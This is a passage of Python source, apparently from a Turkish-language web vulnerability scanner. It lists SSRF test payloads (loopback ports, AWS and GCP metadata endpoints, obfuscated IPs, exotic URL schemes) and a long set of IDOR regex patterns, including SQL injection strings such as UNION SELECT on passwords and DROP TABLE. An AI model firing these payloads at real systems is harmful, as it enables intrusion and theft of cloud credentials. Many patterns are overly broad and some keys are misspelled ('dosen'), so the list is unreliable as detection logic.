    {"payload": "http://127.0.0.1:5353/", "guven": 0.75, "aciklama": "mDNS/Bonjour"},
    {"payload": "http://127.0.0.1:8089/", "guven": 0.75, "aciklama": "IoT device management"},
    {"payload": "http://127.0.0.1:502/", "guven": 0.75, "aciklama": "Modbus protocol"},
    {"payload": "http://127.0.0.1:20000/", "guven": 0.75, "aciklama": "DNP3 protocol"},
    
    # Advanced Cloud Bypass Techniques
    {"payload": "http://[fd00:ec2::254]/latest/meta-data/", "guven": 0.9, "aciklama": "AWS IPv6 metadata"},
    {"payload": "http://instance-data.ec2.internal/", "guven": 0.9, "aciklama": "AWS internal hostname"},
    {"payload": "http://metadata/", "guven": 0.85, "aciklama": "Short metadata hostname"},
    {"payload": "http://metadata.google.internal./", "guven": 0.9, "aciklama": "GCP metadata with dot"},
    {"payload": "http://METADATA.GOOGLE.INTERNAL/", "guven": 0.85, "aciklama": "GCP metadata uppercase"},
    {"payload": "http://metadata.google.internal..", "guven": 0.85, "aciklama": "GCP metadata double dot"},
    
    # Rare and Exotic Protocols
    {"payload": "prospero://127.0.0.1/", "guven": 0.7, "aciklama": "Prospero protocol"},
    {"payload": "wais://127.0.0.1/", "guven": 0.7, "aciklama": "WAIS protocol"},
    {"payload": "z39.50s://127.0.0.1/", "guven": 0.7, "aciklama": "Z39.50 secure"},
    {"payload": "cid://127.0.0.1/", "guven": 0.7, "aciklama": "Content-ID protocol"},
    {"payload": "mid://127.0.0.1/", "guven": 0.7, "aciklama": "Message-ID protocol"},
    {"payload": "vemmi://127.0.0.1/", "guven": 0.7, "aciklama": "VEMMI protocol"},
    {"payload": "service://127.0.0.1/", "guven": 0.75, "aciklama": "Service protocol"},
    {"payload": "irc://127.0.0.1/", "guven": 0.75, "aciklama": "IRC protocol"},
    {"payload": "mms://127.0.0.1/", "guven": 0.75, "aciklama": "Microsoft Media Server"},
    {"payload": "rtsp://127.0.0.1/", "guven": 0.75, "aciklama": "Real Time Streaming"},
    {"payload": "rtsps://127.0.0.1/", "guven": 0.75, "aciklama": "RTSP Secure"},
    {"payload": "mmsh://127.0.0.1/", "guven": 0.75, "aciklama": "MMS over HTTP"},
    {"payload": "mmst://127.0.0.1/", "guven": 0.75, "aciklama": "MMS over TCP"},
    {"payload": "mmsu://127.0.0.1/", "guven": 0.75, "aciklama": "MMS over UDP"},
    
    # Custom Application Protocols
    {"payload": "teamspeak://127.0.0.1/", "guven": 0.75, "aciklama": "TeamSpeak protocol"},
    {"payload": "ts3server://127.0.0.1/", "guven": 0.75, "aciklama": "TeamSpeak 3 server"},
    {"payload": "mumble://127.0.0.1/", "guven": 0.75, "aciklama": "Mumble VoIP"},
    {"payload": "ventrilo://127.0.0.1/", "guven": 0.75, "aciklama": "Ventrilo VoIP"},
    {"payload": "steam://127.0.0.1/", "guven": 0.75, "aciklama": "Steam protocol"},
    {"payload": "xmpp://127.0.0.1/", "guven": 0.75, "aciklama": "XMPP protocol"},
    {"payload": "jabber://127.0.0.1/", "guven": 0.75, "aciklama": "Jabber protocol"},
    {"payload": "sip://127.0.0.1/", "guven": 0.75, "aciklama": "SIP protocol"},
    {"payload": "sips://127.0.0.1/", "guven": 0.75, "aciklama": "Secure SIP"},
    {"payload": "h323://127.0.0.1/", "guven": 0.75, "aciklama": "H.323 protocol"},
    
    # Encoded IP Variations
    {"payload": "http://0x7f.0x0.0x0.0x1/", "guven": 0.85, "aciklama": "Mixed hex encoding"},
    {"payload": "http://0177.0.0.1/", "guven": 0.85, "aciklama": "Octal first octet"},
    {"payload": "http://127.0x0.0x0.0x1/", "guven": 0.85, "aciklama": "Hex trailing octets"},
    {"payload": "http://0x7f000001/", "guven": 0.85, "aciklama": "Full hex IP"},
    {"payload": "http://2130706433/", "guven": 0.85, "aciklama": "Decimal IP conversion"},
    {"payload": "http://017700000001/", "guven": 0.85, "aciklama": "Full octal IP"},
    {"payload": "http://0x7F.0.0.1/", "guven": 0.85, "aciklama": "Uppercase hex"},
    {"payload": "http://0X7f.0.0.1/", "guven": 0.85, "aciklama": "Mixed case hex prefix"},
    {"payload": "http://127.000.000.001/", "guven": 0.8, "aciklama": "Zero padded octets"},
    {"payload": "http://127.0.0.01/", "guven": 0.8, "aciklama": "Partial zero padding"},
            ],
            ZafiyetTipi.IDOR: [
                # Temel IDOR Patternleri
    {"desen": r"Unauthorized", "guven": 0.9, "aciklama": "Yetkisiz erişim"},
    {"desen": r"Access denied", "guven": 0.85, "aciklama": "Erişim reddedildi"},
    {"desen": r"Forbidden", "guven": 0.9, "aciklama": "Yasaklı erişim"},
    {"desen": r"Permission denied", "guven": 0.88, "aciklama": "İzin reddedildi"},
    {"desen": r"Invalid user", "guven": 0.8, "aciklama": "Geçersiz kullanıcı"},
    
    # SQL Injection ile IDOR Kombinasyonu
    {"desen": r"SELECT.*FROM.*WHERE.*id\s*=\s*\d+", "guven": 0.95, "aciklama": "SQL sorgusu ile direkt ID erişimi"},
    {"desen": r"UPDATE.*SET.*WHERE.*user_id\s*=", "guven": 0.92, "aciklama": "User ID ile güncelleme"},
    {"desen": r"DELETE.*FROM.*WHERE.*id\s*IN\s*\(", "guven": 0.9, "aciklama": "ID listesi ile silme"},
    {"desen": r"INSERT.*INTO.*VALUES.*\(\s*\d+", "guven": 0.85, "aciklama": "Sabit ID ile ekleme"},
    {"desen": r"ORDER BY.*user_id.*DESC", "guven": 0.8, "aciklama": "User ID sıralama"},
    
    # API Endpoint IDOR Patternleri
    {"desen": r"/api/v\d+/users/\d+", "guven": 0.95, "aciklama": "API user endpoint"},
    {"desen": r"/api/admin/\d+/delete", "guven": 0.98, "aciklama": "Admin silme endpoint"},
    {"desen": r"/profile/\d+/edit", "guven": 0.9, "aciklama": "Profil düzenleme"},
    {"desen": r"/account/\d+/settings", "guven": 0.88, "aciklama": "Hesap ayarları"},
    {"desen": r"/user/\d+/private", "guven": 0.95, "aciklama": "Özel kullanıcı verisi"},
    
    # Session ve Cookie IDOR
    {"desen": r"session_id\s*=\s*\d+", "guven": 0.9, "aciklama": "Session ID manipülasyonu"},
    {"desen": r"user_token\s*=\s*[a-zA-Z0-9]+", "guven": 0.85, "aciklama": "Token manipülasyonu"},
    {"desen": r"auth_id\s*:\s*\d+", "guven": 0.92, "aciklama": "Auth ID değişimi"},
    {"desen": r"cookie.*user_id.*\d+", "guven": 0.88, "aciklama": "Cookie user ID"},
    {"desen": r"PHPSESSID.*\d+", "guven": 0.8, "aciklama": "PHP session ID"},
    
    # Database IDOR Patternleri
    {"desen": r"pk\s*=\s*\d+", "guven": 0.9, "aciklama": "Primary key erişimi"},
    {"desen": r"id\s*!=\s*current_user", "guven": 0.95, "aciklama": "Başka kullanıcı ID"},
    {"desen": r"owner_id\s*=\s*\$\{.*\}", "guven": 0.88, "aciklama": "Dinamik owner ID"},
    {"desen": r"creator_id\s*<>\s*\d+", "guven": 0.85, "aciklama": "Creator ID farklılığı"},
    {"desen": r"belongs_to.*\d+", "guven": 0.82, "aciklama": "Sahiplik kontrolü"},
    
    # Parameter Tampering IDOR
    {"desen": r"\?id=\d+", "guven": 0.9, "aciklama": "GET parameter ID"},
    {"desen": r"&user=\d+", "guven": 0.88, "aciklama": "User parameter"},
    {"desen": r"account_id=\d+", "guven": 0.92, "aciklama": "Account ID parameter"},
    {"desen": r"profile_id=\d+&", "guven": 0.85, "aciklama": "Profile ID parameter"},
    {"desen": r"object_id=\d+", "guven": 0.9, "aciklama": "Object ID parameter"},
    
    # File Access IDOR
    {"desen": r"/files/\d+/download", "guven": 0.95, "aciklama": "Dosya indirme"},
    {"desen": r"/uploads/user_\d+/", "guven": 0.92, "aciklama": "Kullanıcı upload klasörü"},
    {"desen": r"/documents/\d+\.pdf", "guven": 0.88, "aciklama": "Doküman erişimi"},
    {"desen": r"/images/profile_\d+\.", "guven": 0.8, "aciklama": "Profil resmi"},
    {"desen": r"/private/\d+/", "guven": 0.95, "aciklama": "Özel dosya alanı"},
    
    # JSON/XML Response IDOR
    {"desen": r'"user_id":\s*\d+', "guven": 0.85, "aciklama": "JSON user ID"},
    {"desen": r'"id":\s*\d+.*"private"', "guven": 0.9, "aciklama": "Özel JSON verisi"},
    {"desen": r'<user id="\d+">', "guven": 0.88, "aciklama": "XML user ID"},
    {"desen": r'"owner":\s*\d+', "guven": 0.92, "aciklama": "JSON owner ID"},
    {"desen": r'"account_id":\s*\d+', "guven": 0.87, "aciklama": "JSON account ID"},
    
    # Advanced IDOR Patterns
    {"desen": r"current_user\.id\s*!=\s*target_id", "guven": 0.95, "aciklama": "Kullanıcı ID karşılaştırması"},
    {"desen": r"if\s*\(\s*user_id\s*==\s*\d+\s*\)", "guven": 0.9, "aciklama": "Sabit user ID kontrolü"},
    {"desen": r"authorized_users.*\d+", "guven": 0.88, "aciklama": "Yetkili kullanıcı listesi"},
    {"desen": r"role.*admin.*\d+", "guven": 0.92, "aciklama": "Admin rol kontrolü"},
    {"desen": r"access_level.*\d+", "guven": 0.85, "aciklama": "Erişim seviyesi"},
    
    # Mobile App IDOR
    {"desen": r"device_id.*\d+", "guven": 0.8, "aciklama": "Cihaz ID"},
    {"desen": r"app_user_id.*\d+", "guven": 0.88, "aciklama": "Mobil kullanıcı ID"},
    {"desen": r"push_token.*\d+", "guven": 0.82, "aciklama": "Push token ID"},
    {"desen": r"installation_id.*\d+", "guven": 0.85, "aciklama": "Kurulum ID"},
    {"desen": r"client_id.*\d+", "guven": 0.87, "aciklama": "İstemci ID"},
    
    # E-commerce IDOR
    {"desen": r"/order/\d+/details", "guven": 0.95, "aciklama": "Sipariş detayları"},
    {"desen": r"/cart/\d+/items", "guven": 0.9, "aciklama": "Sepet öğeleri"},
    {"desen": r"/payment/\d+/info", "guven": 0.98, "aciklama": "Ödeme bilgileri"},
    {"desen": r"/invoice/\d+\.pdf", "guven": 0.92, "aciklama": "Fatura erişimi"},
    {"desen": r"/purchase/\d+/receipt", "guven": 0.88, "aciklama": "Satın alma makbuzu"},
    
    # Social Media IDOR
    {"desen": r"/posts/\d+/private", "guven": 0.9, "aciklama": "Özel gönderi"},
    {"desen": r"/messages/\d+/read", "guven": 0.95, "aciklama": "Mesaj okuma"},
    {"desen": r"/friend/\d+/profile", "guven": 0.85, "aciklama": "Arkadaş profili"},
    {"desen": r"/group/\d+/members", "guven": 0.88, "aciklama": "Grup üyeleri"},
    {"desen": r"/chat/\d+/history", "guven": 0.92, "aciklama": "Sohbet geçmişi"},
    
    # Banking/Financial IDOR
    {"desen": r"/account/\d+/balance", "guven": 0.98, "aciklama": "Hesap bakiyesi"},
    {"desen": r"/transaction/\d+/details", "guven": 0.96, "aciklama": "İşlem detayları"},
    {"desen": r"/card/\d+/info", "guven": 0.95, "aciklama": "Kart bilgileri"},
    {"desen": r"/loan/\d+/status", "guven": 0.92, "aciklama": "Kredi durumu"},
    {"desen": r"/investment/\d+/portfolio", "guven": 0.9, "aciklama": "Yatırım portföyü"},
    
    # Healthcare IDOR
    {"desen": r"/patient/\d+/records", "guven": 0.98, "aciklama": "Hasta kayıtları"},
    {"desen": r"/medical/\d+/history", "guven": 0.95, "aciklama": "Tıbbi geçmiş"},
    {"desen": r"/prescription/\d+/details", "guven": 0.92, "aciklama": "Reçete detayları"},
    {"desen": r"/appointment/\d+/info", "guven": 0.88, "aciklama": "Randevu bilgileri"},
    {"desen": r"/lab/\d+/results", "guven": 0.96, "aciklama": "Laboratuvar sonuçları"},
    
    # Education IDOR
    {"desen": r"/student/\d+/grades", "guven": 0.9, "aciklama": "Öğrenci notları"},
    {"desen": r"/course/\d+/materials", "guven": 0.85, "aciklama": "Ders materyalleri"},
    {"desen": r"/exam/\d+/results", "guven": 0.92, "aciklama": "Sınav sonuçları"},
    {"desen": r"/assignment/\d+/submission", "guven": 0.88, "aciklama": "Ödev teslimi"},
    {"desen": r"/transcript/\d+\.pdf", "guven": 0.95, "aciklama": "Transkript belgesi"},
    
    # HR/Employee IDOR
    {"desen": r"/employee/\d+/salary", "guven": 0.98, "aciklama": "Çalışan maaşı"},
    {"desen": r"/hr/\d+/evaluation", "guven": 0.92, "aciklama": "Performans değerlendirmesi"},
    {"desen": r"/payroll/\d+/details", "guven": 0.95, "aciklama": "Bordro detayları"},
    {"desen": r"/leave/\d+/request", "guven": 0.85, "aciklama": "İzin talebi"},
    {"desen": r"/personnel/\d+/file", "guven": 0.9, "aciklama": "Personel dosyası"},
    
    # Legal/Document IDOR
    {"desen": r"/contract/\d+/content", "guven": 0.95, "aciklama": "Sözleşme içeriği"},
    {"desen": r"/legal/\d+/document", "guven": 0.92, "aciklama": "Hukuki belge"},
    {"desen": r"/case/\d+/files", "guven": 0.9, "aciklama": "Dava dosyaları"},
    {"desen": r"/agreement/\d+/terms", "guven": 0.88, "aciklama": "Anlaşma şartları"},
    {"desen": r"/confidential/\d+/", "guven": 0.96, "aciklama": "Gizli belgeler"},
    
    # Cloud Storage IDOR
    {"desen": r"/bucket/\d+/objects", "guven": 0.9, "aciklama": "Depolama bucket"},
    {"desen": r"/storage/user_\d+/", "guven": 0.88, "aciklama": "Kullanıcı depolama"},
    {"desen": r"/cloud/\d+/files", "guven": 0.85, "aciklama": "Bulut dosyaları"},
    {"desen": r"/backup/\d+/restore", "guven": 0.92, "aciklama": "Yedek geri yükleme"},
    {"desen": r"/sync/\d+/data", "guven": 0.87, "aciklama": "Senkronizasyon verisi"},
    
    # Advanced Parameter Patterns
    {"desen": r"uuid=[a-f0-9-]{36}", "guven": 0.85, "aciklama": "UUID parameter"},
    {"desen": r"token=[a-zA-Z0-9]{32,}", "guven": 0.88, "aciklama": "Token parameter"},
    {"desen": r"key=[a-zA-Z0-9]+", "guven": 0.82, "aciklama": "Key parameter"},
    {"desen": r"hash=[a-f0-9]{32,}", "guven": 0.85, "aciklama": "Hash parameter"},
    {"desen": r"signature=[a-zA-Z0-9+/=]+", "guven": 0.87, "aciklama": "Signature parameter"},
    
    # Database Query Patterns
    {"desen": r"WHERE.*user_id.*!=.*current", "guven": 0.92, "aciklama": "Başka kullanıcı sorgusu"},
    {"desen": r"JOIN.*ON.*id.*=.*\d+", "guven": 0.88, "aciklama": "JOIN ile ID kontrolü"},
    {"desen": r"HAVING.*count.*>.*\d+", "guven": 0.8, "aciklama": "HAVING ile sayı kontrolü"},
    {"desen": r"LIMIT.*OFFSET.*\d+", "guven": 0.75, "aciklama": "Sayfalama manipülasyonu"},
    {"desen": r"UNION.*SELECT.*\d+", "guven": 0.9, "aciklama": "UNION ile ID seçimi"},
    
    # Error Message Patterns
    {"desen": r"User \d+ not found", "guven": 0.85, "aciklama": "Kullanıcı bulunamadı hatası"},
    {"desen": r"Invalid ID: \d+", "guven": 0.88, "aciklama": "Geçersiz ID hatası"},
    {"desen": r"Access denied for user \d+", "guven": 0.92, "aciklama": "Kullanıcı erişim reddedildi"},
    {"desen": r"Resource \d+ not accessible", "guven": 0.9, "aciklama": "Kaynak erişilemez"},
    {"desen": r"Permission error: ID \d+", "guven": 0.88, "aciklama": "İzin hatası ID"},
    
    # Framework Specific Patterns
    {"desen": r"@RequestParam.*id.*Integer", "guven": 0.85, "aciklama": "Spring ID parametresi"},
    {"desen": r"params\[:id\]", "guven": 0.88, "aciklama": "Rails ID parametresi"},
    {"desen": r"request\.GET\['id'\]", "guven": 0.9, "aciklama": "Django GET ID"},
    {"desen": r"\$_GET\['user_id'\]", "guven": 0.92, "aciklama": "PHP GET user ID"},
    {"desen": r"req\.params\.id", "guven": 0.87, "aciklama": "Express.js params ID"},
    
    # GraphQL IDOR Patterns
    {"desen": r"query.*user\(id:\s*\d+\)", "guven": 0.9, "aciklama": "GraphQL user query"},
    {"desen": r"mutation.*updateUser.*id:\s*\d+", "guven": 0.95, "aciklama": "GraphQL user mutation"},
    {"desen": r"subscription.*userId:\s*\d+", "guven": 0.88, "aciklama": "GraphQL subscription"},
    {"desen": r"fragment.*on User.*id", "guven": 0.82, "aciklama": "GraphQL fragment"},
    {"desen": r"variables.*userId.*\d+", "guven": 0.85, "aciklama": "GraphQL variables"},
    
    # REST API Patterns
    {"desen": r"PUT /api/users/\d+", "guven": 0.92, "aciklama": "REST PUT kullanıcı"},
    {"desen": r"DELETE /api/\w+/\d+", "guven": 0.95, "aciklama": "REST DELETE kaynağı"},
    {"desen": r"PATCH /api/accounts/\d+", "guven": 0.9, "aciklama": "REST PATCH hesap"},
    {"desen": r"GET /api/v\d+/private/\d+", "guven": 0.88, "aciklama": "REST GET özel"},
    {"desen": r"POST /api/admin/users/\d+", "guven": 0.96, "aciklama": "REST POST admin"},
    
    # Cookie/Session Advanced
    {"desen": r"Set-Cookie.*user_id=\d+", "guven": 0.85, "aciklama": "Cookie user ID set"},
    {"desen": r"sessionStorage.*user.*\d+", "guven": 0.82, "aciklama": "Session storage user"},
    {"desen": r"localStorage.*account.*\d+", "guven": 0.8, "aciklama": "Local storage account"},
    {"desen": r"document\.cookie.*id.*\d+", "guven": 0.87, "aciklama": "Document cookie ID"},
    {"desen": r"HttpOnly.*secure.*id=\d+", "guven": 0.9, "aciklama": "Secure cookie ID"},
    
    # WebSocket IDOR
    {"desen": r"ws://.*user/\d+", "guven": 0.88, "aciklama": "WebSocket user channel"},
    {"desen": r"socket\.emit.*user_id.*\d+", "guven": 0.85, "aciklama": "Socket emit user ID"},
    {"desen": r"room.*user_\d+", "guven": 0.82, "aciklama": "Socket room user"},
    {"desen": r"channel.*private.*\d+", "guven": 0.9, "aciklama": "Private channel ID"},
    {"desen": r"subscribe.*user:\d+", "guven": 0.87, "aciklama": "Subscribe user channel"},
    
    # XML/SOAP IDOR
    {"desen": r"<userId>\d+</userId>", "guven": 0.85, "aciklama": "XML user ID tag"},
    {"desen": r"<soap:Body>.*<id>\d+", "guven": 0.88, "aciklama": "SOAP body ID"},
    {"desen": r"xmlns.*user.*\d+", "guven": 0.8, "aciklama": "XML namespace user"},
    {"desen": r"<account id=\"\d+\"", "guven": 0.9, "aciklama": "XML account attribute"},
    {"dosen": r"CDATA.*user_id.*\d+", "guven": 0.82, "aciklama": "XML CDATA user ID"},
    
    # JWT/Token IDOR
    {"desen": r"eyJ.*user_id.*\d+", "guven": 0.9, "aciklama": "JWT user ID claim"},
    {"desen": r"Bearer.*\d+", "guven": 0.85, "aciklama": "Bearer token ID"},
    {"desen": r"Authorization.*user:\d+", "guven": 0.88, "aciklama": "Auth header user"},
    {"desen": r"X-User-Id:\s*\d+", "guven": 0.92, "aciklama": "Custom user ID header"},
    {"desen": r"refresh_token.*\d+", "guven": 0.87, "aciklama": "Refresh token ID"},
    
    # Database Injection IDOR
    {"desen": r"' OR id=\d+ --", "guven": 0.95, "aciklama": "SQL injection IDOR"},
    {"desen": r"UNION SELECT.*\d+.*password", "guven": 0.98, "aciklama": "UNION IDOR password"},
    {"desen": r"' AND user_id=\d+ #", "guven": 0.92, "aciklama": "SQL AND user ID"},
    {"desen": r"; DROP TABLE users WHERE id=\d+", "guven": 0.9, "aciklama": "SQL DROP IDOR"},
    {"desen": r"' OR 1=1 AND id=\d+", "guven": 0.88, "aciklama": "SQL boolean IDOR"},
    
    # NoSQL IDOR
    {"desen": r"\{\"_id\":\s*\d+\}", "guven": 0.85, "aciklama": "MongoDB ObjectId"},
    {"desen": r"db\.users\.find\(\{id:\d+\}\)", "guven": 0.9, "aciklama": "MongoDB find ID"},
    {"desen": r"collection.*user.*\d+", "guven": 0.82, "aciklama": "NoSQL collection user"},
    {"desen": r"document.*userId.*\d+", "guven": 0.87, "aciklama": "NoSQL document user"},
    {"desen": r"\$match.*user_id.*\d+", "guven": 0.85, "aciklama": "MongoDB aggregation"},
    
    # Redis/Cache IDOR
    {"desen": r"redis.*user:\d+", "guven": 0.85, "aciklama": "Redis user key"},
    {"desen": r"cache.*account_\d+", "guven": 0.82, "aciklama": "Cache account key"},
    {"desen": r"memcached.*user.*\d+", "guven": 0.8, "aciklama": "Memcached user"},
    {"desen": r"SET user:\d+", "guven": 0.87, "aciklama": "Redis SET user"},
    {"desen": r"GET session:\d+", "guven": 0.85, "aciklama": "Redis GET session"},
    
    # Advanced Response Patterns
    {"desen": r"HTTP/1\.1 200.*user_id.*\d+", "guven": 0.85, "aciklama": "HTTP response user ID"},
    {"desen": r"Content-Type.*user.*\d+", "guven": 0.8, "aciklama": "Content type user"},
    {"desen": r"X-User-Role.*\d+", "guven": 0.88, "aciklama": "User role header"},
    {"desen": r"Location:.*user/\d+", "guven": 0.9, "aciklama": "Redirect location user"},
    {"desen": r"ETag:.*user-\d+", "guven": 0.82, "aciklama": "ETag user identifier"},
    
    # File System IDOR
    {"desen": r"/var/www/users/\d+/", "guven": 0.9, "aciklama": "File system user path"},
    {"desen": r"upload_path.*user_\d+", "guven": 0.85, "aciklama": "Upload path user"},
    {"desen": r"temp/.*\d+\.tmp", "guven": 0.8, "aciklama": "Temporary file ID"},
    {"desen": r"logs/user_\d+\.log", "guven": 0.88, "aciklama": "User log file"},
    {"desen": r"backup.*user.*\d+", "guven": 0.87, "aciklama": "User backup file"},
    
    # Configuration IDOR
    {"desen": r"config.*user_id.*\d+", "guven": 0.85, "aciklama": "Config user ID"},
    {"desen": r"settings.*account.*\d+", "guven": 0.82, "aciklama": "Settings account"},
    {"desen": r"properties.*user.*\d+", "guven": 0.8, "aciklama": "Properties user"},
    {"desen": r"environment.*USER_ID.*\d+", "guven": 0.87, "aciklama": "Environment user ID"},
    {"desen": r"yaml.*userId:\s*\d+", "guven": 0.85, "aciklama": "YAML user ID"},
    
    # Advanced URL Patterns
    {"desen": r"/[a-z]+/\d+/[a-z]+/\d+", "guven": 0.88, "aciklama": "Nested ID structure"},
    {"desen": r"\?.*id=\d+.*&.*id=\d+", "guven": 0.9, "aciklama": "Multiple ID parameters"},
    {"desen": r"#/user/\d+/profile", "guven": 0.85, "aciklama": "Hash fragment user"},
    {"desen": r"redirect.*user.*\d+", "guven": 0.82, "aciklama": "Redirect user parameter"},
    {"desen": r"callback.*id.*\d+", "guven": 0.87, "aciklama": "Callback ID parameter"},
    
    # Cryptographic IDOR
    {"desen": r"encrypt.*user_id.*\d+", "guven": 0.88, "aciklama": "Encrypted user ID"},
    {"desen": r"decrypt.*account.*\d+", "guven": 0.9, "aciklama": "Decrypted account"},
    {"desen": r"hash.*user.*\d+", "guven": 0.85, "aciklama": "Hashed user ID"},
    {"desen": r"salt.*id.*\d+", "guven": 0.82, "aciklama": "Salted ID"},
    {"desen": r"cipher.*user_id.*\d+", "guven": 0.87, "aciklama": "Cipher user ID"},
    
    # Race Condition IDOR
    {"desen": r"concurrent.*user.*\d+", "guven": 0.85, "aciklama": "Concurrent user access"},
    {"desen": r"async.*user_id.*\d+", "guven": 0.82, "aciklama": "Async user ID"},
    {"desen": r"thread.*account.*\d+", "guven": 0.8, "aciklama": "Thread account access"},
    {"desen": r"lock.*user:\d+", "guven": 0.87, "aciklama": "Lock user resource"},
    {"desen": r"atomic.*id.*\d+", "guven": 0.85, "aciklama": "Atomic ID operation"},
    
    # Time-based IDOR
    {"desen": r"timestamp.*user.*\d+", "guven": 0.8, "aciklama": "Timestamp user"},
    {"desen": r"expires.*account.*\d+", "guven": 0.85, "aciklama": "Expires account"},
    {"desen": r"created_at.*user_id.*\d+", "guven": 0.82, "aciklama": "Created user ID"},
    {"desen": r"updated.*id.*\d+", "guven": 0.8, "aciklama": "Updated ID"},
    {"desen": r"ttl.*user:\d+", "guven": 0.87, "aciklama": "TTL user key"},
    
    # Complex Logic IDOR
    {"desen": r"if.*user_id.*==.*\d+.*else", "guven": 0.9, "aciklama": "Conditional user ID"},
    {"desen": r"switch.*account.*case.*\d+", "guven": 0.88, "aciklama": "Switch account case"},
    {"desen": r"ternary.*id.*\d+.*:", "guven": 0.85, "aciklama": "Ternary ID operation"},
    {"desen": r"lambda.*user.*\d+", "guven": 0.82, "aciklama": "Lambda user function"},
    {"desen": r"closure.*account_id.*\d+", "guven": 0.87, "aciklama": "Closure account ID"},
    
    # Logging IDOR
    {"desen": r"log.*user_id.*\d+", "guven": 0.85, "aciklama": "Log user ID"},
    {"desen": r"audit.*account.*\d+", "guven": 0.88, "aciklama": "Audit account access"},
    {"desen": r"trace.*user:\d+", "guven": 0.82, "aciklama": "Trace user activity"},
    {"desen": r"debug.*id.*\d+", "guven": 0.8, "aciklama": "Debug ID information"},
    {"desen": r"monitor.*user_id.*\d+", "guven": 0.87, "aciklama": "Monitor user ID"},
    
    # Machine Learning IDOR
    {"desen": r"model.*user_\d+", "guven": 0.8, "aciklama": "ML model user data"},
    {"desen": r"predict.*account.*\d+", "guven": 0.82, "aciklama": "Prediction account"},
    {"desen": r"training.*user_id.*\d+", "guven": 0.85, "aciklama": "Training user ID"},
    {"desen": r"dataset.*id.*\d+", "guven": 0.87, "aciklama": "Dataset ID access"},
    {"desen": r"feature.*user.*\d+", "guven": 0.8, "aciklama": "Feature user extraction"},
    
    # Blockchain/Crypto IDOR
    {"desen": r"wallet.*\d+", "guven": 0.9, "aciklama": "Wallet ID access"},
    {"desen": r"transaction.*user_\d+", "guven": 0.88, "aciklama": "Crypto transaction user"},
    {"desen": r"private_key.*\d+", "guven": 0.98, "aciklama": "Private key access"},
    {"desen": r"address.*user.*\d+", "guven": 0.85, "aciklama": "Crypto address user"},
    {"desen": r"smart_contract.*owner.*\d+", "guven": 0.92, "aciklama": "Smart contract owner"},
    
    # IoT Device IDOR
    {"desen": r"device.*user_\d+", "guven": 0.88, "aciklama": "IoT device user"},
    {"desen": r"sensor.*id.*\d+", "guven": 0.85, "aciklama": "Sensor ID access"},
    {"desen": r"gateway.*user.*\d+", "guven": 0.82, "aciklama": "Gateway user access"},
    {"desen": r"telemetry.*device_\d+", "guven": 0.87, "aciklama": "Telemetry device"},
    {"desen": r"firmware.*user_id.*\d+", "guven": 0.9, "aciklama": "Firmware user ID"},
    
    # Video/Streaming IDOR
    {"desen": r"stream.*user_\d+", "guven": 0.85, "aciklama": "Video stream user"},
    {"desen": r"playlist.*id.*\d+", "guven": 0.82, "aciklama": "Playlist ID access"},
    {"desen": r"video.*owner.*\d+", "guven": 0.88, "aciklama": "Video owner ID"},
    {"dosen": r"live.*user_id.*\d+", "guven": 0.87, "aciklama": "Live stream user"},
    {"desen": r"recording.*account.*\d+", "guven": 0.9, "aciklama": "Recording account"},
    
    # Gaming IDOR
    {"desen": r"player.*id.*\d+", "guven": 0.85, "aciklama": "Player ID access"},
    {"desen": r"game.*user_\d+", "guven": 0.82, "aciklama": "Game user data"},
    {"desen": r"score.*player.*\d+", "guven": 0.8, "aciklama": "Player score"},
    {"desen": r"inventory.*user_id.*\d+", "guven": 0.88, "aciklama": "Game inventory user"},
    {"desen": r"achievement.*player_\d+", "guven": 0.85, "aciklama": "Player achievement"},
    
    # Content Management IDOR
    {"desen": r"article.*author.*\d+", "guven": 0.85, "aciklama": "Article author ID"},
    {"desen": r"post.*user_id.*\d+", "guven": 0.88, "aciklama": "Post user ID"},
    {"desen": r"comment.*author_id.*\d+", "guven": 0.82, "aciklama": "Comment author"},
    {"desen": r"page.*editor.*\d+", "guven": 0.87, "aciklama": "Page editor ID"},
    {"desen": r"draft.*user.*\d+", "guven": 0.85, "aciklama": "Draft user access"},
    
    # Advanced Encoding IDOR
    {"desen": r"base64.*user.*\d+", "guven": 0.87, "aciklama": "Base64 user encoding"},
    {"desen": r"url_encode.*id.*\d+", "guven": 0.85, "aciklama": "URL encoded ID"},
    {"desen": r"hex.*user_id.*\d+", "guven": 0.82, "aciklama": "Hex user ID"},
    {"desen": r"unicode.*account.*\d+", "guven": 0.8, "aciklama": "Unicode account"},
    {"desen": r"escape.*user.*\d+", "guven": 0.85, "aciklama": "Escaped user data"},
    
    # Network Protocol IDOR
    {"desen": r"tcp.*user_\d+", "guven": 0.8, "aciklama": "TCP user connection"},
    {"desen": r"udp.*id.*\d+", "guven": 0.82, "aciklama": "UDP ID packet"},
    {"desen": r"http.*user_id.*\d+", "guven": 0.85, "aciklama": "HTTP user ID"},
    {"desen": r"websocket.*user.*\d+", "guven": 0.87, "aciklama": "WebSocket user"},
    {"desen": r"grpc.*account.*\d+", "guven": 0.88, "aciklama": "gRPC account call"},
    
    # Email/Communication IDOR
    {"desen": r"email.*user_\d+", "guven": 0.88, "aciklama": "Email user access"},
    {"desen": r"inbox.*id.*\d+", "guven": 0.9, "aciklama": "Inbox ID access"},
    {"desen": r"message.*sender.*\d+", "guven": 0.85, "aciklama": "Message sender ID"},
    {"desen": r"notification.*user_id.*\d+", "guven": 0.82, "aciklama": "Notification user"},
    {"desen": r"sms.*recipient.*\d+", "guven": 0.87, "aciklama": "SMS recipient ID"},
    
    # Geo-location IDOR
    {"desen": r"location.*user_\d+", "guven": 0.88, "aciklama": "Location user data"},
    {"desen": r"gps.*id.*\d+", "guven": 0.85, "aciklama": "GPS ID tracking"},
    {"desen": r"coordinates.*user.*\d+", "guven": 0.87, "aciklama": "Coordinates user"},
    {"desen": r"map.*account.*\d+", "guven": 0.82, "aciklama": "Map account access"},
    {"desen": r"route.*user_id.*\d+", "guven": 0.85, "aciklama": "Route user ID"},
    
    # Calendar/Scheduling IDOR
    {"desen": r"calendar.*user_\d+", "guven": 0.85, "aciklama": "Calendar user access"},
    {"desen": r"event.*owner.*\d+", "guven": 0.88, "aciklama": "Event owner ID"},
    {"desen": r"appointment.*user_id.*\d+", "guven": 0.87, "aciklama": "Appointment user"},
    {"desen": r"schedule.*account.*\d+", "guven": 0.82, "aciklama": "Schedule account"},
    {"desen": r"meeting.*organizer.*\d+", "guven": 0.85, "aciklama": "Meeting organizer"},
    
    # Subscription/Billing IDOR
    {"desen": r"subscription.*user_\d+", "guven": 0.9, "aciklama": "Subscription user"},
    {"desen": r"billing.*account.*\d+", "guven": 0.92, "aciklama": "Billing account"},
